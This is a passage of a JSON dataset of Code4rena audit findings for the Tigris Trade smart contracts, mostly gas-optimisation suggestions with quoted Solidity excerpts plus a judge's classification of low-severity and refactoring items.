      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43204",
      "title": "[G-11]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit if-condition on line 615\n616:              if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L616\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43203",
      "title": "[G-10]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n323       function _transfer(\n324           address from,\n325           address to,\n326:          uint256 _id\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L323-L326\n\n```solidity\nFile: contracts/GovNFT.sol\n\n89        function _transfer(\n90            address from,\n91            address to,\n92:           uint256 tokenId\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L89-L92\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43202",
      "title": "[G-09]  `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n52:           counter += 1;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L52\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43201",
      "title": "[G-08]  The result of function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "The instances below point to the second+ call of the function within a single function\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit position.getCount() on line 173\n208:              emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L208\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43200",
      "title": "[G-07]  Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 39 instances of this issue:*\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit _idToAsset[_asset] on line 34\n36:           _idToAsset[_asset].chainlinkFeed = _feed;\n\n/// @audit _idToAsset[_asset] on line 49\n55:           _idToAsset[_asset].name = _name;\n\n/// @audit _idToAsset[_asset] on line 55\n57:           _idToAsset[_asset].chainlinkFeed = _chainlinkFeed;\n\n/// @audit _idToAsset[_asset] on line 57\n59:           _idToAsset[_asset].minLeverage = _minLeverage;\n\n/// @audit _idToAsset[_asset] on line 59\n60:           _idToAsset[_asset].maxLeverage = _maxLeverage;\n\n/// @audit _idToAsset[_asset] on line 60\n61:           _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n\n/// @audit _idToAsset[_asset] on line 61\n62:           _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n\n/// @audit _idToAsset[_asset] on line 74\n78:               _idToAsset[_asset].maxLeverage = _maxLeverage;\n\n/// @audit _idToAsset[_asset] on line 78\n81:               _idToAsset[_asset].minLeverage = _minLeverage;\n\n/// @audit _idToAsset[_asset] on line 81\n/// @audit _idToAsset[_asset] on line 84\n84:           require(_idToAsset[_asset].maxLeverage >= _idToAsset[_asset].minLeverage, \"Wrong leverage values\");\n\n/// @audit _idToAsset[_asset] on line 93\n96:           _idToAsset[_asset].baseFundingRate = _baseFundingRate;\n\n/// @audit _idToAsset[_asset] on line 105\n107:          _idToAsset[_asset].feeMultiplier = _feeMultiplier;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L36\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit _limitOrders[<etc>] on line 150\n151:              _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n\n/// @audit _assetOpenPositions[<etc>] on line 157\n158:              _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n\n/// @audit _limitOrders[_asset] on line 177\n178:          _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n\n/// @audit _limitOrders[_asset] on line 178\n180:          _limitOrders[_asset].pop();\n\n/// @audit _assetOpenPositions[_asset] on line 184\n185:          _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n/// @audit _trades[_id] on line 198\n199:          _trades[_id].leverage = _newLeverage;\n\n/// @audit _trades[_id] on line 210\n211:          _trades[_id].price = _newPrice;\n\n/// @audit _trades[_id] on line 211\n/// @audit _trades[_id] on line 212\n/// @audit _trades[_id] on line 212\n/// @audit _trades[_id] on line 212\n212:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n\n/// @audit _trades[_id] on line 231\n231:          _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n\n/// @audit _trades[_id] on line 231\n/// @audit _trades[_id] on line 232\n232:          _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n\n/// @audit _trades[_id] on line 232\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n/// @audit _trades[_id] on line 233\n233:          initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n\n/// @audit _trades[_id] on line 262\n263:          if (_trades[_id].orderType > 0) {\n\n/// @audit _limitOrders[_asset] on line 264\n265:              _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n\n/// @audit _limitOrders[_asset] on line 265\n267:              _limitOrders[_asset].pop();            \n\n/// @audit _assetOpenPositions[_asset] on line 269\n270:              _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n\n/// @audit _assetOpenPositions[_asset] on line 270\n272:              _assetOpenPositions[_asset].pop();  \n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L151\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit blockDelayPassed[_id] on line 861\n864:                  blockDelayPassed[_id].delay = block.number + blockDelay;\n\n/// @audit blockDelayPassed[_id] on line 864\n865:                  blockDelayPassed[_id].actionType = _type;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L864\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43199",
      "title": "[G-06]  Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence\n\n*There are 40 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit transfer()\n185:          IERC20(tigAsset).transfer(manager, amount);\n\n/// @audit transfer()\n202:          IERC20(_tigAsset).transfer(manager, amount);\n\n/// @audit transferFrom()\n216:          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L185\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit excessivelySafeCall()\n175:          (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n\n/// @audit transfer()\n279:          IERC20(_tigAsset).transfer(_msgsender, amount);\n\n/// @audit transferFrom()\n289:          try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L175\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit transfer()\n39:           IERC20(_tigAsset).transfer(msg.sender, _amount);\n\n/// @audit transfer()\n52:           IERC20(_tigAsset).transfer(msg.sender, amount);\n\n/// @audit transferFrom()\n72:           IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n\n/// @audit transferFrom()\n90:           IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n\n/// @audit transfer()\n104:          IERC20(asset).transfer(_owner, amount);\n\n/// @audit balanceOf()\n114:              uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n\n/// @audit claim()\n115:              IGovNFT(govNFT).claim(assets[i]);\n\n/// @audit balanceOf()\n116:              uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n\n/// @audit approve()\n117:              IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L39\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit transferFrom()\n46:           IERC20(_token).transferFrom(_msgSender(), address(this), _amount);\n\n/// @audit decimals()\n49:               _amount*(10**(18-IERC20Mintable(_token).decimals()))\n\n/// @audit decimals()\n67:           _output = _amount/10**(18-IERC20Mintable(_token).decimals());\n\n/// @audit transfer()\n68:           IERC20(_token).transfer(\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit stable()\n175:          address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n\n/// @audit stable()\n324:          address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n\n/// @audit transfer()\n588:          payable(_proxy).transfer(msg.value);\n\n/// @audit decimals()\n650:              uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n\n/// @audit transferFrom()\n651:              IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n\n/// @audit approve()\n652:              IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n\n/// @audit transfer()\n671:              IERC20(_outputToken).transfer(_trade.trader, _toMint);\n\n/// @audit balanceOf()\n673:              uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n\n/// @audit withdraw()\n674:              IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n\n/// @audit balanceOf()\n/// @audit decimals()\n675:              if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n\n/// @audit transfer()\n/// @audit balanceOf()\n676:              IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n\n/// @audit balanceOf()\n749:          gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n\n/// @audit approve()\n807:          IStable(_tigAsset).approve(address(gov), type(uint).max);\n\n/// @audit stable()\n/// @audit allowed()\n877:          require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L175\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit trades()\n77:           IPosition.Trade memory _trade = IPosition(_positions).trades(_id);\n\n/// @audit recover()\n102           address _provider = (\n103               keccak256(abi.encode(_priceData))\n104:          ).toEthSignedMessageHash().recover(_signature);\n\n/// @audit latestAnswer()\n113:              int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n\n/// @audit decimals()\n115:                  uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L77\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43198",
      "title": "[G-05]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n700:          Fees memory _fees = openFees;\n\n774:          Fees memory _fees = closeFees;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L700\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43197",
      "title": "[G-04]  Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. \n\nSubsequent reads as well as writes have smaller gas savings.\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit Variable ordering with 10 slots instead of the current 11:\n///           uint256(32):id, uint256(32):amount, uint256(32):mintEpoch, uint256(32):mintTime, uint256(32):expireEpoch, uint256(32):pending, uint256(32):shares, uint256(32):period, address(20):owner, bool(1):expired, address(20):asset\n12        struct Bond {\n13            uint id;\n14            address owner;\n15            address asset;\n16            uint amount;\n17            uint mintEpoch;\n18            uint mintTime;\n19            uint expireEpoch;\n20            uint pending;\n21            uint shares;\n22            uint period;\n23            bool expired;\n24:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L12-L24\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n/// @audit Variable ordering with 11 slots instead of the current 12:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tpPrice, uint256(32):slPrice, uint256(32):orderType, uint256(32):id, int256(32):accInterest, address(20):trader, bool(1):direction, address(20):tigAsset\n7         struct Trade {\n8             uint margin;\n9             uint leverage;\n10            uint asset;\n11            bool direction;\n12            uint price;\n13            uint tpPrice;\n14            uint slPrice;\n15            uint orderType;\n16            address trader;\n17            uint id;\n18            address tigAsset;\n19            int accInterest;\n20:       }\n\n/// @audit Variable ordering with 9 slots instead of the current 10:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tp, uint256(32):sl, uint256(32):orderType, address(20):account, bool(1):direction, address(20):tigAsset\n22        struct MintTrade {\n23            address account;\n24            uint256 margin;\n25            uint256 leverage;\n26            uint256 asset;\n27            bool direction;\n28            uint256 price;\n29            uint256 tp;\n30            uint256 sl;\n31            uint256 orderType;\n32            address tigAsset;\n33:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L7-L20\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n/// @audit Variable ordering with 8 slots instead of the current 9:\n///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):tpPrice, uint256(32):slPrice, bytes32(32):referral, address(20):marginAsset, bool(1):direction, address(20):stableVault\n9         struct TradeInfo {\n10            uint256 margin;\n11            address marginAsset;\n12            address stableVault;\n13            uint256 leverage;\n14            uint256 asset;\n15            bool direction;\n16            uint256 tpPrice;\n17            uint256 slPrice;\n18            bytes32 referral;\n19:       }\n\n/// @audit Variable ordering with 5 slots instead of the current 6:\n///           uint256(32):deadline, uint256(32):amount, bytes32(32):r, bytes32(32):s, uint8(1):v, bool(1):usePermit\n21        struct ERC20PermitData {\n22            uint256 deadline;\n23            uint256 amount;\n24            uint8 v;\n25            bytes32 r;\n26            bytes32 s;\n27            bool usePermit;\n28:       }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L9-L19\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit Variable ordering with 5 slots instead of the current 6:\n///           uint256(32):asset, uint256(32):price, uint256(32):spread, uint256(32):timestamp, address(20):provider, bool(1):isClosed\n12    struct PriceData {\n13        address provider;\n14        uint256 asset;\n15        uint256 price;\n16        uint256 spread;\n17        uint256 timestamp;\n18        bool isClosed;\n19:   }\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L12-L19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43196",
      "title": "[G-03]  State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit Variable ordering with 9 slots instead of the current 10:\n///           uint256(32):validSignatureTimer, mapping(32):isNode, mapping(32):minPositionSize, mapping(32):allowedMargin, uint256(32):maxGasPrice, address(20):trading, bool(1):chainlinkEnabled, bool(1):paused, address(20):pairsContract, address(20):referrals, address(20):position\n13:       address public trading;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L13\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43195",
      "title": "[G-02]  State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit trading (constructor)\n35:           trading = _trading;\n\n/// @audit pairsContract (constructor)\n36:           pairsContract = IPairsContract(_pairsContract);\n\n/// @audit referrals (constructor)\n37:           referrals = IReferrals(_ref);\n\n/// @audit position (constructor)\n38:           position = IPosition(_position);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L35\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit pairsContract (constructor)\n151:          pairsContract = IPairsContract(_pairsContract);\n\n/// @audit position (constructor)\n149:          position = IPosition(_position);\n\n/// @audit gov (constructor)\n150:          gov = IGovNFT(_gov);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L151\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43194",
      "title": "[G-01]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n32        mapping(address => bool) public allowedAsset;\n33:       mapping(address => uint) private assetsIndex;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L32-L33\n\n```solidity\nFile: contracts/GovNFT.sol\n\n265       mapping(address => bool) private _allowedAsset;\n266       mapping(address => uint) private assetsIndex;\n267       mapping(address => mapping(address => uint256)) private userPaid;\n268       mapping(address => mapping(address => uint256)) private userDebt;\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L265-L269\n\n```solidity\nFile: contracts/Position.sol\n\n26        mapping(uint256 => uint256[]) private _assetOpenPositions;\n27        mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n28    \n29        mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n30        mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n31    \n32        // Funding\n33        mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n34        mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n35        mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n36        mapping(uint256 => int256) private initId;\n37        mapping(uint256 => mapping(address => uint256)) private longOi;\n38:       mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L24-L38\n\n```solidity\nFile: contracts/StableVault.sol\n\n29        mapping(address => bool) public allowed;\n30:       mapping(address => uint) private tokenIndex;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29-L30\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n17        mapping(address => bool) private isNode;\n18        mapping(address => uint) public minPositionSize;\n19:       mapping(address => bool) public allowedMargin;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L17-L19\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43193",
      "title": "[28] Large multiples of ten should use scientific notation.",
      "impact": "LOW",
      "content": "\nUsing scientific notation for large multiples of ten will improve code readability.\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/TradingExtension.sol#L26\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/657#issuecomment-1366191229):**\n> [01] Use `.call` instead of `.transfer` to send ether\n>\n> Low\n> \n> [02] Unbounded loop\n>\n> Low\n> \n> [03] Use the safe variant and `ERC721.mint`\n>\n> Low\n> \n> [04] Usage of deprecated chainlink API\n>\n> Low\n> \n> [05] Lack of checks-effects-interactions\n>\n> Low\n> \n> [06] Lack of zero address checks for `Trading.sol` constructor for the variables `_position`, `_gov` and `_pairsContract`\n>\n> Low\n> \n> [07] Add an event for critical parameter changes\n>\n> Non-Critical\n> \n> [08] Missing unit tests\n>\n> Refactoring\n> \n> [09] Pragma float\n>\n> Non-Critical\n> \n> [10] Contract layout and order of functions\n>\n> Non-Critical\n> \n> [11] Use time units directly\n>\n> Refactoring\n> \n> [12] Declare interfaces on separate files\n>\n> Refactoring\n> \n> [13] Constants should be upper case\n>\n> Refactoring\n> \n> [14] Use `private constant` consistently\n>\n> Non-Critical\n> \n> [15] Add a limit for the maximum number of characters per line\n>\n> Non-Critical\n> \n> [16] Declaring a `return named variable` and returning a manual value for the same function\n>\n> Refactoring\n> \n> [17] Lack of spacing in comment\n>\n> Non-Critical\n> \n> [18] Critical changes should use two-step procedure\n>\n> Non-Critical\n> \n> [19] Missing NATSPEC\n>\n> Non-Critical\n> \n> [20] Interchangeable usage of uint and uint256\n>\n> Non-Critical\n> \n> [21] Move require/validation statements to the top of the function when validating input parameters\n>\n> Refactoring\n> \n> [22] Remove console.log import in `Lock.sol`\n>\n> Non-Critical\n> \n> [23] Draft openzeppelin dependencies\n>\n> Refactoring\n> \n> [24] Named imports can be used\n>\n> Non-Critical\n> \n> [25] Imports can be grouped together\n>\n> Non-Critical\n> \n> [26] Constant redefined elsewhere\n>\n> Refactoring\n> \n> [27] Convert repeated validation statements into a function modifier to improve code reusability\n>\n> Refactoring\n> \n> [28] Large multiples of ten should use scientific notation.\n>\n> Refactoring\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43192",
      "title": "[27] Convert repeated validation statements into a function modifier to improve code reusability",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L107\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L330\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43191",
      "title": "[26] Constant redefined elsewhere",
      "impact": "LOW",
